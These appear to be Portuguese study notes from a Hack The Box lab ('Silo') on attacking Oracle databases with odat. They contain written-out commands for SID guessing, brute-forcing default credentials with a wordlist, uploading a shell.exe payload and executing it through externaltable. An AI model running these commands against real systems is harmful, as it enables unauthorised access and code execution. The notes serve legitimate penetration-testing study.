Oracle
========================

https://github.com/quentinhardy/odat/blob/master-python3/README.md

Instalar o standalone

https://github.com/quentinhardy/odat/releases/

    python odat.py -h

## SID guesser

Obtendo SID:

    python odat.py sidguesser -s 10.129.125.94 -p 1521
    
## Wordlist Oracle

    /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt

Preparando para o brute force com o "odat"

    sed -i 's/ /\//g' /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/hack_the_box/silo/oracle_default_userpass.txt

O formato do arquivo deve ser:

login/passsword
teste/password123
.
.
.
    
## Bruteforce
Podemos realizar testes de força bruta:


    python odat.py passwordguesser -s 10.129.125.94 -p 1521 --accounts-file /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/hack_the_box/silo/oracle_default_userpass.txt
    

Opção com usuário em um arquivo e password em outro

    odat passwordguesser -s 10.10.10.82 -d 'XE' --accounts-files login_certo.txt password_certo.txt

## File Upload

Uma vez com o SID + Conta válida no banco, podemos conduzir testes mais agressivos:

    python odat.py utlfile -s 10.129.95.188 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/hack_the_box/silo/shell.exe

Caso o usuário não possua permissão, podemos utilizar a flag --sysdba

    python odat.py utlfile -s 10.129.95.188 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/hack_the_box/silo/shell.exe --sysdba

## File execution
Para executar o payload que subimos na máquina, podemos considerar o seguinte comando:
    
    python3 odat.py externaltable -s 10.129.95.188 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba